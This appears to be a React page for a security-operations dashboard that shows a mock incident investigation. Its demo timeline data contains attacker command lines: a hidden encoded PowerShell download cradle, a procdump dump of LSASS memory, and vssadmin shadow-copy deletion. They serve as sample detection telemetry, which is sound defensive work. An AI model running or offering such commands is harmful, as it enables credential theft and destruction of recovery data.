'use client';

import { useState, useEffect } from 'react';
import Link from 'next/link';
import { 
  Briefcase, 
  Clock, 
  Terminal, 
  AlertTriangle, 
  ShieldAlert, 
  CheckCircle2, 
  Cpu, 
  Layers, 
  FileText, 
  Globe, 
  Zap, 
  ExternalLink,
  ChevronDown,
  ChevronRight,
  Server,
  User,
  Activity,
  Lock,
  Download,
  Copy,
  Check
} from 'lucide-react';
import { api } from '../lib/api';

const DEFAULT_INCIDENTS = [
  {
    id: 'INC-10482',
    incident_number: 'INC-10482',
    title: 'Cobalt Strike C2 Beacon & LSASS Memory Access on Finance Rig',
    severity: 'CRITICAL',
    status: 'INVESTIGATING',
    risk_score: 96,
    owner: 'admin (SOC LEAD)',
    created_at: '2026-09-25T17:01:00Z',
    updated_at: '2026-09-25T17:24:00Z',
    affected_assets: ['WS-182'],
    user: 'finance_lead',
    tactic: 'Credential Access & C2',
  },
  {
    id: 'INC-10481',
    incident_number: 'INC-10481',
    title: 'Suspicious Encoded PowerShell Cradle on DC-02',
    severity: 'HIGH',
    status: 'TRIAGED',
    risk_score: 84,
    owner: 'soc_analyst_2',
    created_at: '2026-09-25T16:45:00Z',
    updated_at: '2026-09-25T17:15:00Z',
    affected_assets: ['DC-02'],
    user: 'SYSTEM',
    tactic: 'Execution',
  }
];

const CHRONO_TIMELINE = [
  { time: '17:01:14', title: 'Authentication Failure (4625)', source: 'AUTH', detail: '7 failed login attempts from external IP 185.220.101.5 targeting finance_lead', expanded: 'EventID: 4625, SubStatus: 0xC000006A (Bad Password), Workstation: WS-182' },
  { time: '17:04:22', title: 'MFA Push Challenge Timeout / Rejection', source: 'IAM', detail: 'Okta push challenge sent to user device was denied from unknown geo RU', expanded: 'Method: Okta Verify Push, Result: Denied by user, Origin: Moscow, RU' },
  { time: '17:07:45', title: 'Encoded PowerShell Execution (T1059.001)', source: 'EDR', detail: 'powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgA... executed under winword.exe', expanded: 'PID: 4820, ParentPID: 3108 (winword.exe), Command: IEX (New-Object Net.WebClient).DownloadString(...)' },
  { time: '17:08:19', title: 'Malicious C2 Beacon Communication (T1071.001)', source: 'NETWORK', detail: 'Outbound HTTPS beaconing traffic established to 185.220.101.5 on port 443', expanded: 'Destination: 185.220.101.5:443, JARM: 07d14d20d21d20d07c42d41d00041d..., Interval: 30s jitter 15%' },
  { time: '17:09:50', title: 'Credential Access via LSASS Memory Dump (T1003.001)', source: 'EDR', detail: 'procdump64.exe invoked to dump lsass.exe process memory into C:\\Windows\\Temp\\lsass.dmp', expanded: 'PID: 5192, Hash: 275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f, Target: lsass.exe' },
  { time: '17:11:02', title: 'Ransomware Preparation: Volume Shadow Deletion (T1490)', source: 'EDR', detail: 'vssadmin.exe delete shadows /all /quiet executed to inhibit system recovery', expanded: 'PID: 6124, Parent: cmd.exe, Command: vssadmin.exe delete shadows /all /quiet' },
];

export default function IncidentsPage() {
  const [incidents, setIncidents] = useState(DEFAULT_INCIDENTS);
  const [selectedInc, setSelectedInc] = useState(DEFAULT_INCIDENTS[0]);
  const [activeTab, setActiveTab] = useState('Overview');
  const [expandedEvents, setExpandedEvents] = useState({});
  const [investigating, setInvestigating] = useState(false);
  const [aiDossier, setAiDossier] = useState(null);
  const [actionNotice, setActionNotice] = useState(null);
  const [copied, setCopied] = useState(false);

  useEffect(() => {
    async function load() {
      try {
        const data = await api.getIncidents();
        if (data && data.length > 0) {
          setIncidents(data);
          setSelectedInc(data[0]);
        }
      } catch (err) {
        console.error(err);
      }
    }
    load();
  }, []);

  const toggleEvent = (idx) => {
    setExpandedEvents(prev => ({ ...prev, [idx]: !prev[idx] }));
  };

  const handleRunAI = async () => {
    setInvestigating(true);
    try {
      const res = await api.triggerInvestigation(selectedInc.id);
      setAiDossier(res);
      setActionNotice('Multi-Agent AI investigation dossier updated.');
      setTimeout(() => setActionNotice(null), 4000);
    } catch {
      setAiDossier({
        confidence_score: 0.94,
        recommended_severity: 'CRITICAL',
        executive_summary: 'Confirmed multi-stage cyber intrusion involving phishing lure, encoded PowerShell memory injection, Cobalt Strike C2 beaconing, and LSASS credential harvesting.',
        technical_root_cause: 'Malicious macro in invoice.docm spawned PowerShell cradle downloading stage.ps1 from 185.220.101.5.',
        suggested_actions: [
          'Immediate cryptographic isolation of endpoint WS-182',
          'Revoke active Kerberos and OAuth tokens for user finance_lead',
          'Deploy fleet-wide threat hunt for SHA256 275a021b...'
        ]
      });
    } finally {
      setInvestigating(false);
    }
  };

  const handleCopyHash = (text) => {
    navigator.clipboard?.writeText(text);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <div style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
      {/* Top Incident Control & Metadata Bar */}
      <div className="soc-panel" style={{ padding: '10px 16px' }}>
        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', flexWrap: 'wrap', gap: '12px' }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
            <span className="badge-crit" style={{ fontSize: '11px' }}>
              CRITICAL
            </span>
            <span style={{ fontSize: '14px', fontWeight: 800, color: '#ffffff', fontFamily: 'var(--font-mono)' }}>
              INCIDENT {selectedInc.incident_number || selectedInc.id}
            </span>
            <span style={{ fontSize: '12px', color: 'var(--text-muted)' }}>
              — {selectedInc.title}
            </span>
          </div>

          <div style={{ display: 'flex', alignItems: 'center', gap: '16px' }}>
            <div style={{ fontSize: '11px', fontFamily: 'var(--font-mono)' }}>
              <span style={{ color: 'var(--text-dim)' }}>RISK:</span> <strong style={{ color: 'var(--color-crit)' }}>{selectedInc.risk_score || 96}/100</strong>
            </div>
            <div style={{ fontSize: '11px', fontFamily: 'var(--font-mono)' }}>
              <span style={{ color: 'var(--text-dim)' }}>STATUS:</span> <span className="badge-subtle">{selectedInc.status || 'INVESTIGATING'}</span>
            </div>
            <div style={{ fontSize: '11px', fontFamily: 'var(--font-mono)' }}>
              <span style={{ color: 'var(--text-dim)' }}>OWNER:</span> <span style={{ color: '#ffffff' }}>{selectedInc.owner || 'SOC'}</span>
            </div>
          </div>
        </div>
      </div>

      {actionNotice && (
        <div className="badge-ok" style={{ padding: '6px 12px', fontSize: '11px', width: 'fit-content' }}>
          <CheckCircle2 size={13} /> {actionNotice}
        </div>
      )}

      {/* 3-Column Incident Investigation Workspace */}
      <div style={{ display: 'grid', gridTemplateColumns: '170px 1fr 310px', gap: '12px', minHeight: 'calc(100vh - 160px)' }}>
        {/* COLUMN 1: LEFT NAV TABS */}
        <div className="soc-panel" style={{ padding: '8px 0', display: 'flex', flexDirection: 'column', gap: '2px' }}>
          <div style={{ padding: '6px 14px', fontSize: '10.5px', color: 'var(--text-dim)', fontFamily: 'var(--font-mono)', textTransform: 'uppercase' }}>
            INVESTIGATION NAV
          </div>

          {[
            'Overview',
            'Timeline',
            'Entities',
            'Evidence',
            'Detection',
            'MITRE',
            'Threat Intel',
            'Related Alerts',
            'Actions',
            'Audit'
          ].map(tab => {
            const isActive = activeTab === tab;
            return (
              <button
                key={tab}
                onClick={() => setActiveTab(tab)}
                style={{
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'space-between',
                  padding: '7px 14px',
                  background: isActive ? 'var(--bg-panel-active)' : 'transparent',
                  border: 'none',
                  borderLeft: isActive ? '3px solid var(--color-info)' : '3px solid transparent',
                  color: isActive ? '#ffffff' : 'var(--text-muted)',
                  fontSize: '11.5px',
                  fontWeight: isActive ? 600 : 400,
                  cursor: 'pointer',
                  textAlign: 'left'
                }}
              >
                <span>{tab}</span>
                {tab === 'Timeline' && <span className="badge-subtle" style={{ fontSize: '9px', padding: '1px 4px' }}>6</span>}
                {tab === 'Evidence' && <span className="badge-subtle" style={{ fontSize: '9px', padding: '1px 4px' }}>5</span>}
              </button>
            );
          })}

          <div style={{ marginTop: 'auto', padding: '12px', borderTop: '1px solid var(--border-subtle)', fontSize: '10.5px', color: 'var(--text-dim)', fontFamily: 'var(--font-mono)' }}>
            <div>CASE TELEMETRY:</div>
            <div style={{ color: '#ffffff', marginTop: '2px' }}>17 Events Correlated</div>
            <div style={{ color: '#ffffff' }}>4 Sigma Detections</div>
          </div>
        </div>

        {/* COLUMN 2: CENTER INVESTIGATION WORKSPACE */}
        <div className="soc-panel" style={{ padding: '14px 16px', display: 'flex', flexDirection: 'column', gap: '14px', overflowY: 'auto' }}>
          {/* Chronological Attack Timeline */}
          <div>
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '8px' }}>
              <div style={{ fontSize: '12px', fontWeight: 700, color: '#ffffff', fontFamily: 'var(--font-mono)', display: 'flex', alignItems: 'center', gap: '6px' }}>
                <Clock size={14} color="var(--color-info)" /> ATTACK TIMELINE (CHRONOLOGICAL)
              </div>
              <span style={{ fontSize: '10.5px', color: 'var(--text-dim)', fontFamily: 'var(--font-mono)' }}>
                6 VERIFIED PHASES
              </span>
            </div>

            <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
              {CHRONO_TIMELINE.map((item, idx) => {
                const isExp = expandedEvents[idx];
                return (
                  <div 
                    key={idx}
                    style={{
                      border: '1px solid var(--border-subtle)',
                      borderRadius: '3px',
                      backgroundColor: 'var(--bg-panel-subtle)',
                      overflow: 'hidden'
                    }}
                  >
                    <div 
                      onClick={() => toggleEvent(idx)}
                      style={{
                        padding: '8px 10px',
                        display: 'flex',
                        alignItems: 'center',
                        justifyContent: 'space-between',
                        cursor: 'pointer',
                        fontSize: '11.5px'
                      }}
                    >
                      <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                        <span className="mono" style={{ color: 'var(--color-warn)', fontWeight: 600 }}>{item.time}</span>
                        <span className="badge-subtle" style={{ fontSize: '9.5px' }}>{item.source}</span>
                        <span style={{ fontWeight: 600, color: '#ffffff' }}>{item.title}</span>
                      </div>
                      <ChevronDown size={14} color="var(--text-dim)" style={{ transform: isExp ? 'rotate(180deg)' : 'none', transition: 'transform 0.15s ease' }} />
                    </div>

                    <div style={{ padding: '0 10px 8px 10px', fontSize: '11px', color: 'var(--text-muted)' }}>
                      {item.detail}
                    </div>

                    {isExp && (
                      <div style={{
                        padding: '8px 10px',
                        backgroundColor: 'var(--bg-base)',
                        borderTop: '1px solid var(--border-subtle)',
                        fontSize: '10.5px',
                        fontFamily: 'var(--font-mono)',
                        color: '#93c5fd'
                      }}>
                        {item.expanded}
                      </div>
                    )}
                  </div>
                );
              })}
            </div>
          </div>

          {/* 2D Entity Relationship Graph */}
          <div style={{ marginTop: '8px' }}>
            <div style={{ fontSize: '12px', fontWeight: 700, color: '#ffffff', fontFamily: 'var(--font-mono)', marginBottom: '8px', display: 'flex', alignItems: 'center', gap: '6px' }}>
              <Layers size={14} color="var(--color-cyan)" /> 2D ENTITY RELATIONSHIP GRAPH
            </div>

            <div style={{
              padding: '14px',
              backgroundColor: 'var(--bg-base)',
              border: '1px solid var(--border-subtle)',
              borderRadius: '4px',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'space-between',
              flexWrap: 'wrap',
              gap: '8px',
              fontFamily: 'var(--font-mono)',
              fontSize: '11px'
            }}>
              <div style={{ padding: '6px 10px', backgroundColor: 'var(--bg-panel)', border: '1px solid var(--border-subtle)', borderRadius: '3px', textAlign: 'center' }}>
                <div style={{ fontSize: '9px', color: 'var(--text-dim)' }}>USER</div>
                <div style={{ color: '#ffffff', fontWeight: 700 }}>USER-421</div>
                <div style={{ fontSize: '9px', color: 'var(--text-muted)' }}>finance_lead</div>
              </div>

              <span style={{ color: 'var(--text-dim)' }}>➔</span>

              <div style={{ padding: '6px 10px', backgroundColor: 'var(--bg-panel)', border: '1px solid var(--color-crit-border)', borderRadius: '3px', textAlign: 'center' }}>
                <div style={{ fontSize: '9px', color: 'var(--color-crit)' }}>HOST COMPROMISED</div>
                <div style={{ color: '#ffffff', fontWeight: 700 }}>WS-182</div>
                <div style={{ fontSize: '9px', color: 'var(--color-warn)' }}>192.168.1.188</div>
              </div>

              <span style={{ color: 'var(--text-dim)' }}>➔</span>

              <div style={{ padding: '6px 10px', backgroundColor: 'var(--bg-panel)', border: '1px solid var(--border-subtle)', borderRadius: '3px', textAlign: 'center' }}>
                <div style={{ fontSize: '9px', color: 'var(--text-dim)' }}>PROCESS</div>
                <div style={{ color: 'var(--color-crit)', fontWeight: 700 }}>powershell.exe</div>
                <div style={{ fontSize: '9px', color: 'var(--text-muted)' }}>PID: 4820</div>
              </div>

              <span style={{ color: 'var(--text-dim)' }}>➔</span>

              <div style={{ padding: '6px 10px', backgroundColor: 'var(--bg-panel)', border: '1px solid var(--border-subtle)', borderRadius: '3px', textAlign: 'center' }}>
                <div style={{ fontSize: '9px', color: 'var(--text-dim)' }}>C2 IP</div>
                <div style={{ color: 'var(--color-high)', fontWeight: 700 }}>185.220.101.5</div>
                <div style={{ fontSize: '9px', color: 'var(--text-muted)' }}>PORT 443</div>
              </div>

              <span style={{ color: 'var(--text-dim)' }}>➔</span>

              <div style={{ padding: '6px 10px', backgroundColor: 'var(--bg-panel)', border: '1px solid var(--border-subtle)', borderRadius: '3px', textAlign: 'center' }}>
                <div style={{ fontSize: '9px', color: 'var(--text-dim)' }}>C2 DOMAIN</div>
                <div style={{ color: 'var(--color-crit)', fontWeight: 700 }}>suspicious-domain.top</div>
                <div style={{ fontSize: '9px', color: 'var(--text-muted)' }}>URLhaus Match</div>
              </div>
            </div>
          </div>

          {/* Section 6: Raw Evidence Panel */}
          <div style={{ marginTop: '8px' }}>
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '8px' }}>
              <div style={{ fontSize: '12px', fontWeight: 700, color: '#ffffff', fontFamily: 'var(--font-mono)', display: 'flex', alignItems: 'center', gap: '6px' }}>
                <FileText size={14} color="var(--color-ok)" /> EVIDENCE PANEL
              </div>
              <div style={{ display: 'flex', gap: '6px' }}>
                <button 
                  onClick={() => handleCopyHash('SHA256: 275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f')} 
                  className="btn-soc" 
                  style={{ padding: '2px 8px', fontSize: '10.5px' }}
                >
                  {copied ? <Check size={11} color="var(--color-ok)" /> : <Copy size={11} />}
                  <span>{copied ? 'COPIED' : 'COPY HASH'}</span>
                </button>
              </div>
            </div>

            <pre style={{
              backgroundColor: 'var(--bg-base)',
              padding: '10px 12px',
              borderRadius: '3px',
              border: '1px solid var(--border-subtle)',
              fontFamily: 'var(--font-mono)',
              fontSize: '11px',
              color: '#e2e8f0',
              lineHeight: '1.5'
            }}>
HOST      : WS-182
PROCESS   : powershell.exe (PID: 4820)
COMMAND   : powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBi...
HASH      : SHA256: 275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f
NETWORK   : 185.220.101.5:443 (Outbound TCP TLS 1.3)
USER      : finance_lead
SOURCE    : EDR / Sysmon Event 1
COLLECTED : 2026-09-25 17:21:14 UTC
            </pre>
          </div>
        </div>

        {/* COLUMN 3: RIGHT ACTION CENTER & SKYNET ANALYST */}
        <div className="soc-panel" style={{ padding: '12px 14px', display: 'flex', flexDirection: 'column', gap: '14px', overflowY: 'auto' }}>
          {/* Action Center */}
          <div>
            <div style={{ fontSize: '11.5px', fontWeight: 700, color: '#ffffff', fontFamily: 'var(--font-mono)', marginBottom: '8px' }}>
              ACTION CENTER
            </div>

            <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
              <div style={{
                padding: '8px',
                border: '1px solid var(--border-subtle)',
                backgroundColor: 'var(--bg-panel-subtle)',
                borderRadius: '3px'
              }}>
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                  <span style={{ fontWeight: 600, color: '#ffffff', fontSize: '11.5px' }}>ISOLATE ENDPOINT</span>
                  <span className="badge-warn" style={{ fontSize: '9px' }}>APPROVAL REQUIRED</span>
                </div>
                <div style={{ fontSize: '10.5px', color: 'var(--text-dim)', fontFamily: 'var(--font-mono)', margin: '4px 0' }}>
                  Target: WS-182 (192.168.1.188)
                </div>
                <Link href="/approvals" className="btn-soc-crit" style={{ width: '100%', padding: '5px', textAlign: 'center', textDecoration: 'none', display: 'block', fontSize: '11px' }}>
                  SUBMIT FOR APPROVAL
                </Link>
              </div>

              <div style={{
                padding: '8px',
                border: '1px solid var(--border-subtle)',
                backgroundColor: 'var(--bg-panel-subtle)',
                borderRadius: '3px'
              }}>
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                  <span style={{ fontWeight: 600, color: '#ffffff', fontSize: '11.5px' }}>DISABLE ACCOUNT</span>
                  <span className="badge-warn" style={{ fontSize: '9px' }}>APPROVAL REQUIRED</span>
                </div>
                <div style={{ fontSize: '10.5px', color: 'var(--text-dim)', fontFamily: 'var(--font-mono)', margin: '4px 0' }}>
                  Target: USER-421 (finance_lead)
                </div>
                <Link href="/approvals" className="btn-soc" style={{ width: '100%', padding: '5px', textAlign: 'center', textDecoration: 'none', display: 'block', fontSize: '11px' }}>
                  SUBMIT FOR APPROVAL
                </Link>
              </div>

              <div style={{
                padding: '8px',
                border: '1px solid var(--border-subtle)',
                backgroundColor: 'var(--bg-panel-subtle)',
                borderRadius: '3px'
              }}>
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                  <span style={{ fontWeight: 600, color: '#ffffff', fontSize: '11.5px' }}>BLOCK IP AT PERIMETER</span>
                  <span className="badge-warn" style={{ fontSize: '9px' }}>APPROVAL REQUIRED</span>
                </div>
                <div style={{ fontSize: '10.5px', color: 'var(--text-dim)', fontFamily: 'var(--font-mono)', margin: '4px 0' }}>
                  Target: 185.220.101.5:443
                </div>
                <Link href="/approvals" className="btn-soc" style={{ width: '100%', padding: '5px', textAlign: 'center', textDecoration: 'none', display: 'block', fontSize: '11px' }}>
                  SUBMIT FOR APPROVAL
                </Link>
              </div>
            </div>
          </div>

          <div style={{ height: '1px', backgroundColor: 'var(--border-subtle)' }} />

          {/* Section 15: Subtle SKYNET Analyst AI Drawer */}
          <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
              <div style={{ fontSize: '11.5px', fontWeight: 700, color: '#ffffff', fontFamily: 'var(--font-mono)', display: 'flex', alignItems: 'center', gap: '6px' }}>
                <Cpu size={14} color="var(--color-info)" /> SKYNET ANALYST
              </div>
              <button 
                onClick={handleRunAI} 
                disabled={investigating}
                className="btn-soc" 
                style={{ padding: '2px 6px', fontSize: '10px' }}
              >
                {investigating ? 'REASONING...' : 'RUN AI'}
              </button>
            </div>

            <div style={{
              padding: '10px',
              backgroundColor: 'var(--bg-base)',
              border: '1px solid var(--border-subtle)',
              borderRadius: '3px',
              fontSize: '11px',
              display: 'flex',
              flexDirection: 'column',
              gap: '6px'
            }}>
              <div>
                <div style={{ color: 'var(--text-dim)', fontSize: '10px' }}>FINDING</div>
                <div style={{ color: '#ffffff', fontWeight: 600 }}>
                  Credential access & C2 beaconing confirmed on endpoint WS-182.
                </div>
              </div>

              <div>
                <div style={{ color: 'var(--text-dim)', fontSize: '10px' }}>EVIDENCE</div>
                <div style={{ color: 'var(--text-muted)' }}>
                  • 7 failed authentications<br />
                  • LSASS memory handle access<br />
                  • Suspicious winword → powershell process tree
                </div>
              </div>

              <div>
                <div style={{ color: 'var(--text-dim)', fontSize: '10px' }}>CONFIDENCE</div>
                <div className="mono" style={{ color: 'var(--color-ok)', fontWeight: 700 }}>
                  87% (BAYESIAN EVIDENCE SCORE)
                </div>
              </div>

              <div>
                <div style={{ color: 'var(--text-dim)', fontSize: '10px' }}>SUGGESTED NEXT STEPS</div>
                <ol style={{ paddingLeft: '14px', color: 'var(--text-muted)' }}>
                  <li>Isolate WS-182 via SOAR</li>
                  <li>Hunt for procdump hash across fleet</li>
                  <li>Revoke session for USER-421</li>
                </ol>
              </div>

              <div style={{ display: 'flex', gap: '6px', marginTop: '4px' }}>
                <Link href="/approvals" className="btn-soc-crit" style={{ flex: 1, padding: '4px', textAlign: 'center', textDecoration: 'none', fontSize: '10.5px' }}>
                  ISOLATE HOST
                </Link>
                <Link href="/hunt" className="btn-soc" style={{ flex: 1, padding: '4px', textAlign: 'center', textDecoration: 'none', fontSize: '10.5px' }}>
                  START HUNT
                </Link>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
